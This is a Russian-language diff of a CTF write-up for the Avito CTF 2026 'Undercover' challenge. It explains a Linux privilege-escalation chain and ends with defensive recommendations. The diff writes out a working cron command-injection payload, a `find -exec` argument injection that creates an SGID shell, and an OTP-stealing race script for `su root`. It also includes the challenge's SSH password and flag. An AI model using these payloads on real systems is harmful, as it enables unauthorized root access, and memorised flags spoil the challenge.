@@ -1,292 +1,226 @@
-# Undercover — разбор
+# Undercover — технический разбор
 
 **Флаг:** `avito{the_OP3ra7I0n_wAS_suCce5sfuL}`
-**Класс:** Linux / privilege escalation (повышение прав; цепочка cron → SGID → OTP-по-почте) ·
-**Сложность:** не зафиксирована в архиве · **Очки:** не зафиксированы · **Решило команд:** не зафиксировано
-**Автор:** оргкоманда Avito CTF 2026 · SPbCTF (конкретный ник в архиве не зафиксирован)
+**Класс:** Linux / local privilege escalation / command injection / PAM
 
-## В двух словах (без терминов)
+## Краткое техническое резюме
 
-Нам дали вход на сервер под самым бесправным пользователем (`worker`, «рабочая пчела»). Флаг лежит в файле,
-который может прочитать только главный администратор (`root`). Значит задача — из «уборщика» дорасти до
-«директора».
+Initial access предоставлен как `worker` в ephemeral Debian container. Privilege escalation состоит
+из трёх stages:
 
-Прямого пути наверх нет, но есть три мелкие небрежности, которые по одиночке безобидны, а вместе строят
-лесенку. Ступенька 1: сервер раз в минуту сам запускает служебную задачу от имени другого пользователя и при
-этом склеивает команду из файла, в который нам разрешено писать — мы дописываем туда свою команду.
-Ступенька 2: есть программа с «повышенной групповой печатью», через которую мы получаем права группы `mail`
-(почтовиков). Ступенька 3: одноразовый пароль для входа под `root` приходит письмом в почтовый ящик root, а
-этот ящик читают все из группы `mail` — куда мы уже пробрались. Ловим пароль, скармливаем его входу под root —
-и читаем флаг.
+```text
+worker
+  -> cron command injection -> backupuser
+  -> SGID binary argument injection -> egid=mail
+  -> disclosure PAM OTP from /var/mail/root -> uid=0
+```
+
+World-writable `/backup/listing` интерполируется в `sh -c` под `backupuser`. Полученный execution
+context запускает SGID-mail binary с injected `find -exec`, создавая persistent SGID shell. PAM
+отправляет root OTP в mailbox с mode `0660 mail:mail`; процесс с `egid=mail` читает OTP и передаёт его
+в `su root`.
 
 ---
 
-## 1. Что за задача
+## 1. Контекст и цель
 
-Мы — оперативник-медоед, уже захвативший учётку самой бесправной «рабочей пчелы» `worker`. Нужно **тихо и
-быстро** дорасти до `root` и прочитать `/root/flag.txt`.
+Initial SSH access:
 
-```
+```text
 ssh worker@undercover-zhvo8wkj.avitoctf.ru
-пароль: ufqIDMVBm5MHPHg8dcVTcQ
+password: ufqIDMVBm5MHPHg8dcVTcQ
 ```
 
-> Мини-словарь. **SSH** — защищённый удалённый вход в командную строку сервера. **root** — всемогущий
-> администратор Linux (`uid=0`), которому доступно всё. **Privilege escalation (повышение привилегий, privesc)**
-> — искусство из обычного пользователя стать администратором, пользуясь чужими ошибками настройки.
+Цель — получить `uid=0` и прочитать `/root/flag.txt`. Каждый новый SSH connection создаёт новый
+container, поэтому все filesystem modifications и privilege transitions должны выполняться в одной
+persistent session.
 
-Итоговая цепочка привилегий, которую мы собрали:
+## 2. Reconnaissance и attack surface
 
+Стандартная local privilege escalation enumeration включает:
+
+```bash
+id
+sudo -n -l
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab
+find /etc/cron.d -maxdepth 1 -type f -print -exec cat {} \;
 ```
-worker  ──(cron + инъекция команд)──►  backupuser
-        ──(SGID-mail + инъекция аргументов в find)──►  egid=mail
-        ──(OTP в mailbox root, читаемом группой mail)──►  root
-```
 
-## 2. Разведка — что мы увидели
+Relevant findings:
 
-Методология privesc = **энумерация → найти неаккуратно настроенную вещь, работающую с более высокими правами.**
-(Энумерация — методичный осмотр системы: что где лежит, кто что запускает, у кого какие права.) Прогнали
-стандартный чек-лист (см. также `task.md`):
+- Debian 12 внутри ephemeral Docker container;
+- `/etc/cron.d/backup` запускается раз в минуту как `backupuser`;
+- `/backup/listing` имеет mode `0777`;
+- `/backup/deactivated/utils/delete_old_mail` имеет
+  `-rwxr-sr-- backupuser mail`;
+- `su` использует `/usr/local/bin/pam_otp_root.py` через PAM;
+- `/var/mail/root` имеет owner/group `mail:mail` и mode `0660`.
 
-- `id` — `uid=1000(worker)`, обычный юзер.
-- `sudo -n -l` — sudo требует пароль → мимо.
-- `find / -perm -4000` и `find / -perm -2000` — ищем **SUID/SGID** бинарники.
-- `getcap -r /` — capabilities (точечные привилегии на отдельных программах).
-- `/etc/cron.d/*`, `/etc/crontab`, таймеры — **что root и другие юзеры запускают по расписанию**, и не пишем
-  ли мы в их входные данные.
-- версия ОС/ядра, запущенные сервисы.
+Directory `/backup/deactivated` имеет mode `drwx---r-x root backupuser`. `worker` получает access по
+other bits, тогда как `backupuser` не имеет directory execute permission через group bits. Поэтому
+`worker` перемещает SGID binary в `/tmp/.dom` внутри той же overlay filesystem, сохраняя SGID bit, а
+`backupuser` запускает его позже через cron injection.
 
-> Мини-словарь. **SUID/SGID-бит** — особая метка на программе: при запуске она получает права **владельца**
-> (SUID) или **группы** (SGID) файла, а не того, кто её запустил. Пример: программа с SGID-группой `mail`
-> запускается «от имени почтовиков», даже если её дёрнул обычный юзер. Это законный механизм (так работает,
-> например, `passwd`), но если такая программа делает что-то неаккуратно — она превращается в лифт наверх.
-> **cron** — планировщик: запускает задачи по расписанию (например, раз в минуту), часто от имени root или
-> служебных пользователей.
+## 3. Анализ и проверка гипотез
 
-Что нашлось и почему это заинтересовало:
+### 3.1. `worker` → `backupuser`: shell command injection
 
-- **Debian 12 в Docker**. Критично: **каждое SSH-подключение = свежий одноразовый контейнер.** Значит все
-  звенья цепочки надо пройти в ОДНОЙ сессии (мы держали постоянный канал через `session_server.py`), иначе
-  изменения теряются между командами.
-- `/etc/cron.d/backup` — раз в минуту что-то запускается от **`backupuser`** (чужие права по расписанию →
-  первый кандидат).
-- SGID-бинарь **`delete_old_mail`** с группой **`mail`** (`-rwxr-sr-- backupuser mail`) — «утилита» с
-  повышенной группой.
-- SUID `exim4` (почтовый сервер), PAM-модуль `pam_otp_root.py` в `/etc/pam.d/su` — почта и нестандартная
-  аутентификация root.
-
-> Мини-словарь. **PAM** (Pluggable Authentication Modules) — «конструктор проверок входа» в Linux: файл вроде
-> `/etc/pam.d/su` описывает, какие шаги нужно пройти, чтобы стать пользователем. **OTP** (one-time password) —
-> одноразовый пароль, действующий один раз. **mailbox** — почтовый ящик пользователя, обычно файл в `/var/mail/`.
-
-## 3. Как мы дошли до решения (главный раздел)
-
-**Наблюдение → гипотеза (сшивка звеньев).** Четыре находки из разведки складываются в один сюжет ещё до
-эксплуатации: есть почта (`exim4`), есть OTP для входа под root, который куда-то доставляется, есть бинарь,
-дающий повышенную группу `mail`, и есть cron под чужим юзером. **Гипотеза:** ключ к root — это одноразовый OTP,
-который PAM-модуль кладёт в почтовый ящик root; если получить `gid=mail`, ящик станет читаемым. Осталось найти
-два «моста»: как получить `egid=mail` и как до него — права `backupuser`.
-
-**Проверка звеньев по очереди** (каждое подтверждалось на живой цели):
-
-- **Звено к `backupuser`.** `/etc/cron.d/backup` раз в минуту от `backupuser` собирает строку
-  `sh -c "rsync … $INPUT /backup/"`, где `$INPUT` = содержимое файла `/backup/listing`. Права этого файла —
-  `0777` (писать может кто угодно, включая `worker`). Значит содержимое файла попадает в командную строку
-  **без кавычек** → это **command injection** (инъекция команд): дописав в файл `;<команда>;`, мы заставим
-  `<команда>` выполниться уже от имени `backupuser`.
-- **Звено к `egid=mail`.** SGID-бинарь `delete_old_mail` внутри зовёт
-  `system("find /var/mail/ -type f -mtime +<ARG> -print -delete")`, где `<ARG>` берётся из аргумента. Есть
-  чёрный список символов `has_forbidden_chars` (`; ' " \` \ $ ( ) | & < >`), но он **не запрещает пробел, `+`
-  и `{}`** → в команду `find` можно дописать `-o -type d -exec … {} +`. Это **argument injection** (инъекция
-  аргументов): мы не ломаем сам шелл, а подсовываем `find` дополнительные ключи, и `find` сам запускает наш
-  скрипт — уже с `egid=mail`.
-
-  > Мини-словарь. **command injection** — подмешивание своей команды в строку, которую программа отдаёт шеллу
-  > (`sh -c "…"`), потому что ввод не заэкранирован. **argument injection** — когда ввод нельзя вырваться в
-  > шелл, но можно добавить программе (тут — `find`) её собственные опасные ключи (`-exec`), и она сделает
-  > грязную работу за тебя. **`egid=mail`** — «эффективная групповая личность» = mail: программа действует как
-  > член группы почтовиков.
-
-- **Тонкость доступа (мини-тупик, решённый обходом).** Каталог `/backup/deactivated` =
-  `drwx---r-x root backupuser`: у самого `backupuser` групповые биты `---` → внутрь он **войти не может**, а
-  `worker` (other `r-x`) — может, но сам бинарь исполним только владельцем-`backupuser`. Вывод: `worker`
-  **выносит бинарь наружу** (`mv … /tmp/.dom` — в пределах одной overlayfs это сохраняет SGID-бит), а
-  **запускает его `backupuser`** через звено 1.
-- **Звено к root.** `/etc/pam.d/su` содержит `pam_python.so /usr/local/bin/pam_otp_root.py` (`requisite`) и
-  `pam_succeed_if.so … user = root` (`[success=done default=ignore]`). Модуль генерит 9-значный OTP, шлёт его
-  **письмом** root (`/var/mail/root`, права `660 mail:mail`) и спрашивает код. **Ключевое наблюдение:** этот
-  ящик читается группой `mail`, а на звене 2 мы как раз получили `egid=mail`. Значит можно **параллельно** с
-  `su root` вытащить OTP из ящика и скормить его — `pam_succeed_if user=root` даст «success=done» → root без
-  знания пароля root.
-
-**Эфемерность как отдельная сложность.** Так как контейнер пересоздаётся на каждое подключение, все шаги нужно
-исполнять в одной живой сессии. Отсюда `session_server.py` — постоянный SSH shell-канал, удерживающий один
-контейнер и гоняющий по нему команды из файловой очереди.
-
-> Бытовая аналогия всей цепочки. Уборщик (`worker`) не может войти в кабинет директора. Но: (1) он подсовывает
-> записку в папку «сделать по расписанию», и её по ошибке выполняет завхоз (`backupuser`) — теперь команды идут
-> от завхоза; (2) у завхоза есть служебный степлер с печатью «почта», который, если хитро задать ему задание,
-> ставит нам печать почтовика; (3) одноразовый код от сейфа директора приходит письмом, а почтовый ящик читают
-> все почтальоны — мы среди них. Достаём код, открываем сейф.
-
-## 4. В чём именно ошибка (суть уязвимости)
-
-Три бага, каждый — классическая ошибка:
-
-1. **Инъекция команд**: содержимое writable-файла подставляется в строку `sh -c "…$INPUT…"` без кавычек.
-2. **Инъекция аргументов**: SGID-бинарь зовёт `system("find … -mtime +<ARG> …")`, а чёрный список символов
-   **неполон** (пропускает пробел, `+`, `{}`), что позволяет дописать `-exec`.
-3. **Секрет в групп-читаемом ресурсе**: одноразовый OTP для входа под root кладётся в `/var/mail/root` с
-   правами `660 mail:mail` → читается **всей группой `mail`**.
-
-## 5. Эксплойт по шагам
-
-### Звено 1: command injection (worker → backupuser)
-
-`/etc/cron.d/backup` раз в минуту от имени `backupuser` делает по сути:
+Cron job выполняет equivalent logic:
 
 ```sh
-INPUT=$(cat "$1")                                        # $1 = /backup/listing
-/bin/sh -c "rsync --archive --verbose $INPUT /backup/"   # $INPUT НЕ в кавычках!
+INPUT=$(cat "$1")
+/bin/sh -c "rsync --archive --verbose $INPUT /backup/"
 ```
 
-Файл `/backup/listing` имеет права `0777` — писать может кто угодно, включая worker. Пишем в файл
-`;<команда>;#`, и в ближайшую минуту `<команда>` выполнится уже как `backupuser`.
+`INPUT` читается из world-writable `/backup/listing` и интерполируется в shell command без quoting.
+Payload вида `;<command>;#` добавляет самостоятельную shell command, исполняемую как `backupuser`.
 
-*Почему баг:* недоверенный ввод (содержимое writable-файла) попадает в строку шелл-команды. Правильно — не
-звать `sh -c` со склейкой, а передавать аргументы массивом.
+### 3.2. `backupuser` → `egid=mail`: argument injection
 
-### Звено 2: SGID-mail + argument injection (backupuser → egid=mail)
-
-`/backup/deactivated/utils/delete_old_mail` — `-rwxr-sr-- backupuser mail` (**SGID-mail**: при запуске получает
-`egid=mail`). Внутри:
+SGID binary вызывает:
 
 ```c
 setregid(mail, mail);
-system("find /var/mail/ -type f -mtime +<ARG> -print -delete");   // <ARG> из аргумента
+system("find /var/mail/ -type f -mtime +<ARG> -print -delete");
 ```
 
-Чёрный список не запрещает пробелы, `+` и `{}` → дописываем аргументы в `find`. Полезная нагрузка (файл
-`payload.txt` / поле аргумента):
+`has_forbidden_chars` блокирует часть shell metacharacters, но разрешает spaces, `+` и `{}`. Это не
+позволяет вставить новый shell operator, однако позволяет расширить argv синтаксиса `find`:
 
-```
+```text
 1 -o -type d -exec /tmp/.m.sh {} + -o -type f
 ```
 
-`find -exec /tmp/.m.sh {} +` запустит наш скрипт `/tmp/.m.sh` уже с `egid=mail`. Этим скриптом (`m.sh`) делаем
-**постоянный SGID-mail bash**:
+`find -exec` запускает `/tmp/.m.sh` с effective group `mail`. Script создаёт копию Bash с SGID bit:
 
 ```sh
-cp /bin/bash /tmp/.mbash && chmod 2755 /tmp/.mbash   # 2755 = setgid, group=mail
+cp /bin/bash /tmp/.mbash
+chmod 2755 /tmp/.mbash
 ```
 
-Обход прав каталога `/backup/deactivated` (см. §3): worker выносит бинарь наружу
-(`mv /backup/deactivated/utils/delete_old_mail /tmp/.dom`), а запускает его backupuser. Итоговая полезная
-нагрузка в `/backup/listing` (см. `payload.txt`):
+Итоговая строка для `/backup/listing`:
 
-```
+```text
 ;/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#
 ```
 
-По cron это выполняется как `backupuser` → `/tmp/.dom` (наш `delete_old_mail`) под `egid=mail` через
-`find -exec` создаёт `/tmp/.mbash` — bash с SGID-mail.
+После следующего cron interval появляется `/tmp/.mbash`. Запуск `/tmp/.mbash -p` сохраняет
+effective group `mail`.
 
-### Звено 3: OTP-по-почте (egid=mail → root)
+### 3.3. `egid=mail` → root: PAM OTP disclosure
 
-`/etc/pam.d/su`:
+`/etc/pam.d/su` содержит:
 
-```
+```text
 auth requisite pam_python.so /usr/local/bin/pam_otp_root.py
 auth [success=done default=ignore] pam_succeed_if.so quiet user = root
 ```
 
-Модуль `pam_otp_root.py` (лежит на самой цели в `/usr/local/bin/`, локально его у нас нет) генерит 9-значный
-OTP и **отправляет его письмом root** (`mail -s "OTP for root login" root` → exim → `/var/mail/root`, режим
-`660 mail:mail`), затем спрашивает код у пользователя. Верный OTP проходит `requisite`, а `pam_succeed_if
-user=root` даёт `success=done` → **root без пароля root**.
+`pam_otp_root.py` генерирует 9-digit OTP, отправляет его локальной почтой пользователю root и ожидает
+interactive input. Message записывается в `/var/mail/root`, доступный group `mail`.
 
-Оркестратор `orch.sh` (запускается нашим `/tmp/.mbash -p`, т.е. с `egid=mail`) делает это гонкой:
+`orch.sh` запускает `su root` в pseudo-terminal, параллельно выполняет polling mailbox и передаёт найденный OTP
+через FIFO:
 
 ```sh
-rm -f /var/mail/root ...                      # убрать старое письмо, чтобы не поймать чужой OTP
-mkfifo /tmp/sin; exec 3<>/tmp/sin             # канал для подачи OTP в su
-# su в псевдотерминале (script), сразу читает флаг после логина:
+mkfifo /tmp/sin
+exec 3<>/tmp/sin
+
 script -q -f -c 'su root -c "id; echo FLAGSTART; cat /root/flag.txt; echo FLAGEND; \
-     cat /root/flag.txt >/tmp/flag_out"' /tmp/su.log < /tmp/sin &
-# поллим mailbox root, пока не появится строка ровно из 9 цифр:
+  cat /root/flag.txt >/tmp/flag_out"' /tmp/su.log < /tmp/sin &
+
 for i in $(seq 1 200); do
-  OTP=$(tr -d '\r' < /var/mail/root | awk '/^[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$/{print; exit}')
+  OTP=$(tr -d '\r' < /var/mail/root | \
+    awk '/^[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$/{print; exit}')
   [ -n "$OTP" ] && break
   sleep 0.25
 done
-printf '%s\n' "$OTP" >&3                        # отдаём OTP в su через fifo
+
+printf '%s\n' "$OTP" >&3
 ```
 
-`su` принимает OTP → `pam_succeed_if user=root` → **root** → `cat /root/flag.txt` пишет флаг в `/tmp/flag_out`.
+Успешный OTP удовлетворяет `requisite`, а `pam_succeed_if user=root` завершает authentication stack с
+success. Команда внутри `su` выполняется как `uid=0`.
 
-*Почему баг:* секрет второго фактора (OTP) не должен быть доступен никому, кроме проверяющего. Здесь он лежит в
-mailbox, читаемом целой группой `mail`, в которую мы смогли попасть.
+## 4. Корневая причина
 
-### Полный прогон (всё в одной сессии)
+Цепочка объединяет независимые configuration и implementation defects:
 
-Поскольку контейнер эфемерный, шаги выполняются в одном постоянном канале (`session_server.py`):
+1. **Shell command injection:** содержимое world-writable file интерполируется в `sh -c` без
+   validation или quoting.
+2. **Argument injection:** privileged wrapper принимает строковый fragment command line и защищается
+   неполным character denylist.
+3. **Unsafe SGID execution:** elevated binary вызывает `system()` с user-controlled input.
+4. **OTP confidentiality failure:** authentication secret хранится в group-readable mailbox.
+5. **Excessive group capability:** compromise `egid=mail` автоматически предоставляет access к root
+   authentication factor.
 
-1. `mv /backup/deactivated/utils/delete_old_mail /tmp/.dom` — вынести SGID-mail бинарь наружу (worker может).
-2. Записать `/tmp/.m.sh` (см. `m.sh`): `cp /bin/bash /tmp/.mbash; chmod 2755 /tmp/.mbash`.
-3. В `/backup/listing` записать полезную нагрузку (см. `payload.txt`) и ждать cron (до минуты):
-   `;/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#`
-   → cron(backupuser) → `find -exec` создаёт `/tmp/.mbash` c SGID-mail.
-4. Запустить `/tmp/.mbash -p orch.sh` (сессия с `egid=mail`): гонка `su root` ↔ чтение OTP из `/var/mail/root`
-   → root → флаг.
+Ephemeral containers ограничивают persistence между connections, но не устраняют exploitability
+внутри одной session.
 
-Все четыре шага идут в одном SSH-контейнере и автоматизированы из корня:
+## 5. Эксплуатация
+
+End-to-end solver удерживает один Paramiko PTY, загружает `m.sh` и `orch.sh`, ожидает cron и извлекает
+flag output:
 
 ```bash
-uv run python task12/solve_task12.py --host <challenge-host>
+uv run python task12/solve_task12.py \
+  --host undercover-zhvo8wkj.avitoctf.ru
 ```
 
-Скрипт сам загружает `m.sh`/`orch.sh` по существующему каналу, ждёт cron и извлекает `avito{...}`.
+Execution sequence:
+
+1. `worker` выполняет
+   `mv /backup/deactivated/utils/delete_old_mail /tmp/.dom`;
+2. solver создаёт `/tmp/.m.sh`;
+3. solver записывает injection payload в `/backup/listing`;
+4. cron запускает `/tmp/.dom` как `backupuser`;
+5. `find -exec` создаёт `/tmp/.mbash` с SGID `mail`;
+6. `/tmp/.mbash -p orch.sh` запускает OTP race;
+7. `su root` читает `/root/flag.txt`.
+
+Локальная validation command:
+
+```bash
+uv run python task12/solve_task12.py --self-test
+```
+
+`session_server.py` предоставляет альтернативный persistent SSH channel с filesystem command queue
+`NNN.cmd → NNN.out → NNN.done`, но основной solver использует единый Paramiko PTY напрямую.
 
 ## 6. Флаг
 
-```
+```text
 avito{the_OP3ra7I0n_wAS_suCce5sfuL}
 ```
 
-Прочитан из `/root/flag.txt` от имени `uid=0(root)` (совпадает с `FLAG.txt` в папке).
+## 7. Выводы и рекомендации
 
-## 7. Мораль — какой это урок
+- Нельзя строить command lines через `sh -c` и string interpolation. Используйте `execve`/subprocess
+  с фиксированным argv и без shell parsing.
+- Numeric parameters должны проходить allowlist validation по типу и range; character denylist не
+  предотвращает option/argument injection.
+- SUID/SGID programs не должны вызывать `system()` с input, который контролирует менее
+  привилегированный principal.
+- OTP и другие authentication factors должны быть доступны только verifier process. Group-readable
+  mailbox не обеспечивает required confidentiality.
+- Privilege escalation review должен анализировать composability: writable cron inputs, privileged
+  wrappers и group-readable secrets создают критическую цепочку даже при умеренной severity каждого
+  отдельного finding.
+- Ephemeral target требует transport/session orchestration, сохраняющего один container instance на
+  протяжении всего exploit chain.
 
-- **Три мелочи → root.** По отдельности writable-файл, SGID-утилита и OTP-в-почте выглядят безобидно; privesc —
-  это искусство сшивать их в цепочку. Защищаясь, оценивай не «опасен ли пункт сам по себе», а «во что он
-  складывается с соседними».
-- **Экранируй ввод.** Не `sh -c "…$X…"`, а массив аргументов. И чёрный список символов — плохая защита от
-  инъекции аргументов: `find` управляется через `-o`, `-exec`, `{}`, `+`, которые формально не «спецсимволы».
-  Как надо: белый список (только цифры для числового аргумента) вместо чёрного.
-- **SGID/SUID + `system()` = красный флаг.** Программа с повышенными правами не должна вызывать шелл со строкой,
-  собранной из ввода. Если очень надо запустить внешнюю утилиту — только через `execve` с явным массивом
-  аргументов и жёсткой валидацией.
-- **Секреты — только проверяющему.** OTP в групп-читаемом файле = OTP скомпрометирован для всей группы.
-  Второй фактор должен быть виден только тому коду, который его проверяет, а не всем почтальонам.
-- **Эфемерное окружение.** Docker-контейнер на каждое подключение → эксплойт нужно собирать в одной сессии
-  (постоянный канал), иначе артефакты между командами теряются. Полезно и защитнику: одноразовость контейнера
-  сама по себе не спасает, если внутри есть цепочка.
+## 8. Файлы для воспроизведения
 
-## 8. Файлы в папке
+Version-controlled artifacts:
 
-- `solve_task12.py` — основной end-to-end entry point: один постоянный Paramiko PTY, загрузка обоих
-  shell-пейлоадов, command/argument injection, ожидание cron, OTP-гонка и печать root-флага. Быстрая
-  локальная проверка: `uv run python task12/solve_task12.py --self-test`.
-- `session_server.py` — выверенный скрипт: постоянный SSH shell-канал, удерживающий ОДИН эфемерный контейнер, и
-  файловая очередь команд (`NNN.cmd → NNN.out → NNN.done`). Именно он позволяет пройти всю цепочку в одной
-  сессии (ruff+ty чисто, Google-docstring; `paramiko` без стабов → точечный `# ty: ignore`).
-- `m.sh` — скрипт, который `find -exec` запускает под `egid=mail`; создаёт SGID-mail bash `/tmp/.mbash`.
-- `orch.sh` — оркестратор третьего звена: гонка `su root` ↔ чтение OTP из `/var/mail/root`.
-- `FLAG.txt` — сохранённый флаг.
+- `task12/solve_task12.py` — основной end-to-end solver с persistent Paramiko PTY.
+- `task12/session_server.py` — persistent SSH shell и filesystem command queue.
+- `task12/m.sh` — payload, исполняемый `find -exec` с `egid=mail`.
+- `task12/orch.sh` — PAM OTP race и root command execution.
 
-Строка для `/backup/listing` собрана прямо в `solve_task12.py`; прежние одноразовые SSH-обёртки и
-runtime-файлы очереди в deliverable не входят и остаются под `.gitignore`.
-
-> Примечание: `pam_otp_root.py` и `/etc/pam.d/su` — файлы на самой цели (в контейнере), у нас в папке их нет;
-> в разборе они упомянуты по полному пути на сервере, а не как локальные файлы.
+`/usr/local/bin/pam_otp_root.py` и `/etc/pam.d/su` находятся только внутри target container; это
+server-side paths, а не repository artifacts.
